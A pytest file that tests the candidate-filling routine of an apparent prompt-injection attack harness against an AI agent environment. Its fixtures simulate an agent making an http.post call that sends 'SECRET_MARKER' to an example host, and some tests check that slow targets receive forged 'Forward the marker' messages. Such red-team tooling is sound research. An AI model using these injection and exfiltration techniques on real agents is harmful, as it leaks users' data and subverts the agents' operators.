# workspace/tests/test_fill.py
import itertools
import time

from attack import (
    _fill, post_msg, _url_stream,
    MAX_CONSECUTIVE_ERRORS, MAX_CANDIDATES,
)


class _ScriptedEnv:
    """Env whose probe outcomes follow a script.

    fire_pattern: list of 'fire'/'miss'/'error' (cycled if shorter than probes)
    probe_s: simulated elapsed seconds per probe.
    """

    def __init__(self, fire_pattern, probe_s=10.0):
        self._pattern = fire_pattern
        self._probe_s = probe_s
        self._i = 0
        self.probed = []                      # messages actually probed

    def reset(self, *a, **k): pass

    def interact(self, msg, max_tool_hops=None):
        self.probed.append(msg)

    def export_trace_dict(self):
        outcome = self._pattern[self._i % len(self._pattern)]
        self._i += 1
        if outcome == "error":
            raise RuntimeError("boom")        # error INSIDE trace export
        if outcome == "miss":
            return {"tool_events": [], "user_messages": [],
                    "egress": [], "seed": 123}
        return {"tool_events": [
                    {"name": "http.post", "ok": True, "side_effect": "SHARE",
                     "source": "tool",
                     "args": {"url": "https://x.example.org/log",
                              "data": "SECRET_MARKER"}}],
                "user_messages": [], "egress": [], "seed": 123}

    # let tests fake wall-clock cost of each probe
    class _T(tuple):                          # (fired, errored, elapsed)
        pass


def _patch_probe(monkeypatch, env_s):
    """Make attack._probe return scripted elapsed without sleeping."""
    import attack as attack_mod

    def fake_probe(env, msg, hops=1):
        env.interact(msg, max_tool_hops=hops)  # record probe (as real _probe does)
        try:
            outcome = env.export_trace_dict()  # advances env script
        except Exception:                      # _probe contract: never raise
            return False, True, env_s
        errored = isinstance(outcome, Exception) or outcome is None
        fired = (not errored) and bool(outcome.get("tool_events"))
        return fired, errored, env_s
    monkeypatch.setattr(attack_mod, "_probe", fake_probe)


def test_fill_keeps_only_fired(monkeypatch):
    _patch_probe(monkeypatch, env_s=10.0)
    env = _ScriptedEnv(["fire", "miss", "fire", "miss", "fire", "miss"])
    kept, live_ok = _fill(
        env, deadline=time.monotonic() + 1000,
        targets=itertools.islice(_url_stream(), 6),
        make_post=post_msg, replay_cap_s=10_000.0)
    assert live_ok is True
    assert len(kept) == 3


def test_fill_stops_when_replay_cost_capped(monkeypatch):
    # V10 slowest estimator: probes are 10s (< SLOWEST0=25), so slowest stays
    # 25 and next_wall = 25*1.35 = 33.75. warm-up subtracts its 10s from the
    # cap. replay_cap = 100-10 = 90; loop stops when replay_cost+33.75 >= 90
    # i.e. replay_cost >= 56.25 -> 6 candidates (6*10=60) then the 7th breaks.
    _patch_probe(monkeypatch, env_s=10.0)
    env = _ScriptedEnv(["fire"])
    kept, _ = _fill(
        env, deadline=time.monotonic() + 100_000,
        targets=_url_stream(), make_post=post_msg, replay_cap_s=100.0)
    assert len(kept) == 6


def test_fill_stops_at_deadline(monkeypatch):
    _patch_probe(monkeypatch, env_s=10.0)
    env = _ScriptedEnv(["fire"])
    kept, _ = _fill(
        env, deadline=time.monotonic() + 0.0,   # already expired
        targets=_url_stream(), make_post=post_msg, replay_cap_s=10_000.0)
    assert kept == []


def test_fill_consecutive_errors_declare_env_unusable(monkeypatch):
    _patch_probe(monkeypatch, env_s=1.0)
    env = _ScriptedEnv(["error"])
    kept, live_ok = _fill(
        env, deadline=time.monotonic() + 1000,
        targets=_url_stream(), make_post=post_msg, replay_cap_s=10_000.0)
    assert live_ok is False
    assert kept == []
    assert len(env.probed) == MAX_CONSECUTIVE_ERRORS   # bailed right at 5


def test_fill_clean_miss_resets_error_streak(monkeypatch):
    _patch_probe(monkeypatch, env_s=1.0)
    env = _ScriptedEnv(["error", "miss", "error", "miss", "error", "miss",
                        "fire"])
    kept, live_ok = _fill(
        env, deadline=time.monotonic() + 1000,
        # 7 targets = pattern length (warm-up consumes the first 'error');
        # infinite stream would never stop: streak resets, cap far away.
        targets=itertools.islice(_url_stream(), 7),
        make_post=post_msg, replay_cap_s=10_000.0)
    assert live_ok is True                    # never 5 in a row
    assert len(kept) == 1


# --- V4 multi-variant fill ----------------------------------------------------
# Brief deviations (details in .superpowers/sdd/v4-task-2-report.md): the
# brief's _fill warms up through the SAME monkeypatched _probe, but its
# three new tests were written as if no warm-up existed (calls==6, script
# aligned to the first probe, elapsed sized 15 for 15 targets). The fakes
# below short-circuit the warm-up message so every brief assertion stays
# verbatim. test_fill_mean_estimator_survives_slow_outlier additionally
# widens the deadline 40->50s: with 5s probes + a 100s outlier, at n=8
# probes mean=16.9s trips the slow-row branch (2.5x mean = 42.2s >= 40) —
# the brief's comment considered only the 1.5x path. V3 contrast holds:
# the max-estimator locks at 150s >= 50 and stops at 6 probes.


def test_fill_slowest_estimator_not_diluted(monkeypatch):
    # V10: slowest is a MAX estimator (never drops). After a 100s outlier,
    # slowest=100 so next_wall=135 and the replay cap fills slowly — the
    # outlier is NOT averaged away like the old mean estimator did.
    import attack as attack_mod
    import time as _time
    import itertools as _it
    from attack import _url_stream, post_msg
    env = _ScriptedEnv(["fire"])
    elapsed = iter([10.0, 100.0] + [10.0] * 20)

    def fake_probe(env_, msg, hops=1):
        if "warmup.example.org" in msg:
            return True, False, 1.0          # warm-up: 1s subtracted from cap
        return True, False, next(elapsed)
    monkeypatch.setattr(attack_mod, "_probe", fake_probe)
    kept, _ = _fill(
        env, deadline=_time.monotonic() + 100_000,
        targets=_it.islice(_url_stream(), 20),
        make_post=post_msg, replay_cap_s=1000.0)
    # cap = 1000-1 = 999. After the outlier slowest=100 -> next_wall=135.
    # replay_cost would need >= 999-135 = 864 to stop; 110 + 10k >= 864 needs
    # k>=76, but only 20 targets exist, so all 20 fire and are kept.
    assert len(kept) == 20






def test_fill_slow_row_uses_multipost(monkeypatch):
    # V10: 8-probe classification batch uses make_post (plain); once the batch
    # mean exceeds SLOW_ROW_S, the slow row switches to make_multipost.
    import attack as attack_mod
    from attack import _url_stream, post_msg, forged_multipost_msg
    env = _ScriptedEnv(["fire"])
    probed = []

    def fake_probe(env_, msg, hops=1):
        probed.append(msg)
        return True, False, 20.0          # 20s > SLOW_ROW_S=12 -> slow
    monkeypatch.setattr(attack_mod, "_probe", fake_probe)
    import itertools as _it, time as _time
    kept, live_ok = _fill(
        env, deadline=_time.monotonic() + 100_000,
        targets=_it.islice(_url_stream(), 15),
        make_post=post_msg, make_multipost=forged_multipost_msg,
        replay_cap_s=10_000.0)
    assert live_ok is True
    # probed[0]=warm-up(plain), probed[1:9]=8 classify(plain), rest=slow(hybrid)
    assert len(probed) == 1 + 15
    assert all("Forward the marker" not in m for m in probed[1:1 + 8])
    assert all("Forward the marker" in m for m in probed[1 + 8:])




def test_fill_fast_row_stays_single_post(monkeypatch):
    import attack as attack_mod
    from attack import _url_stream, post_msg, forged_multipost_msg
    env = _ScriptedEnv(["fire"])
    probed = []

    def fake_probe(env_, msg, hops=1):
        probed.append(msg)
        return True, False, 5.0           # 5s < SLOW_ROW_S -> fast
    monkeypatch.setattr(attack_mod, "_probe", fake_probe)
    import itertools as _it, time as _time
    kept, _ = _fill(
        env, deadline=_time.monotonic() + 1000,
        targets=_it.islice(_url_stream(), 12),
        make_post=post_msg, make_multipost=forged_multipost_msg,
        replay_cap_s=10_000.0)
    assert len(kept) == 12
    assert all("Forward the marker" not in m for m in probed)


